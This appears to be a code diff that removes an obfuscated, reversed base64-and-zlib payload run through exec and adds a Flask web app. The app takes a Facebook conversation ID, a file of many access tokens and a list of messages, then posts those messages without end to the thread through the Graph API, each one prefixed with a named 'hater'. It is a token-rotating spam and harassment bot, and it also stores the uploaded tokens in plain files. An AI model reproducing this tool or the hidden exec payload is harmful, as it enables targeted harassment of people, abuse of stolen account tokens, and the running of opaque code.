@@ -1,6 +1,208 @@
-# ENCODE : TRICK BY SEERAT RULEX BRAND 
-# Obfuscated with PyObfuscate
-# # GITHUB : # https://github.com/trickbyanaysa
-## YOUTUBE : https://www.youtube.com/@Trick-by-rulex-seerat-brand
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+from flask import Flask, request, render_template, redirect, url_for
+import requests
+import time
+import os
+
+app = Flask(__name__)
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+
+@app.route('/')
+def index():
+    return '''
+        <html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROYAL PNB RULEX SEERAT</title>
+    <style>
+        /* CSS for styling elements */
+
+            
+
+label{
+    color: yellow;
+}
+
+.file{
+    height: 30px;
+}
+body{
+    background-image: url('https://i.ibb.co/BVyV1ny/36270096e26722a6a5ab589120d13fbc.jpg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    
+}
+    .container{
+      max-width: 700px;
+      height: 600px;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 10px yellow;
+            border: none;
+            resize: none;
+    }
+        .form-control {
+            outline: 1px red;
+            border: 1px double white;
+            background: transparent; 
+            width: 100%;
+            height: 40px;
+            padding: 7px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            color: white;
+        }
+        .btn-submit {
+            
+            border-radius: 20px;
+            align-items: center;
+            background-color: #4CAF50;
+            color: white;
+            margin-left: 70px;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+                .btn-submit:hover{
+                    background-color: red;
+                }
+            
+        h3{
+            text-align: center;
+            color: white;
+            font-family: cursive;
+        }
+        h2{
+            text-align: center;
+            color: white;
+            font-size: 14px;
+            font-family: Courier;
+        }
+    </style>
+</head>
+<body>
+
+
+<div class="container">
+    <h3>༒𝐑𝐎𝐘𝐀𝐋 𝐏𝐔𝐍𝐉𝐀𝐁 𝐑𝐔𝐋𝐄𝐗༄☬</h3>
+    <h2></h2>
+    <form action="/" method="post" enctype="multipart/form-data">
+        <div class="mb-3">
+            <label for="threadId">SEERAT_CONVO_ID:</label>
+            <input type="text" class="form-control" id="threadId" name="threadId" required>
+        </div>
+        <div class="mb-3">
+                     <label for="txtFile">SLECT YOUR SEERAT TOKENS FILE:</label>
+            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+            <label  for="messagesFile">SELECT YOUR SEERAT NP FILE:</label>
+            <input  type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" placeholder="NP" required>
+        </div>
+        <div class="mb-3">
+            <label for="kidx">ENTER SEERAT HATER NAME:</label>
+            <input type="text" class="form-control" id="kidx" name="kidx" required>
+        </div>
+        <div class="mb-3">
+            <label for="time">SEERAT SPEED IN SECONDS: </label>
+            <input type="number" class="form-control" id="time" name="time" value="60" required>
+        </div>
+        <br />
+        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+    </form>
+    <h3> CREDIT :TRICKER  SEERAT BRAND</h3>
+    
+</div
+    
+    '''
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        access_tokens = txt_file.read().decode().splitlines()
+
+        messages_file = request.files['messagesFile']
+        messages = messages_file.read().decode().splitlines()
+
+        num_comments = len(messages)
+        max_tokens = len(access_tokens)
+
+        # Create a folder with the Convo ID
+        folder_name = f"Convo_{thread_id}"
+        os.makedirs(folder_name, exist_ok=True)
+
+        # Create files inside the folder
+        with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
+            f.write(thread_id)
+
+        with open(os.path.join(folder_name, "token.txt"), "w") as f:
+            f.write("\n".join(access_tokens))
+
+        with open(os.path.join(folder_name, "haters.txt"), "w") as f:
+            f.write(mn)
+
+        with open(os.path.join(folder_name, "time.txt"), "w") as f:
+            f.write(str(time_interval))
+
+        with open(os.path.join(folder_name, "message.txt"), "w") as f:
+            f.write("\n".join(messages))
+
+        with open(os.path.join(folder_name, "np.txt"), "w") as f:
+            f.write("NP")  # Assuming NP is a fixed value
+
+        post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+        haters_name = mn
+        speed = time_interval
+
+        while True:
+            try:
+                for message_index in range(num_comments):
+                    token_index = message_index % max_tokens
+                    access_token = access_tokens[token_index]
+
+                    message = messages[message_index].strip()
+
+                    parameters = {'access_token': access_token,
+                                  'message': haters_name + ' ' + message}
+                    response = requests.post(
+                        post_url, json=parameters, headers=headers)
+
+                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                    if response.ok:
+                        print("[+] SEND SUCCESSFUL No. {} Post Id {}  time{}: Token No.{}".format(
+                            message_index + 1, post_url, token_index + 1, haters_name + ' ' + message))
+                        print("  - Time: {}".format(current_time))
+                        print("\n" * 2)
+                    else:
+                        print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                            message_index + 1, post_url, token_index + 1, haters_name + ' ' + message))
+                        print("  - Time: {}".format(current_time))
+                        print("\n" * 2)
+                    time.sleep(speed)
+            except Exception as e:
+              
+                      
+                print(e)
+                time.sleep(30)
+
+    return redirect(url_for('index'))
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
+
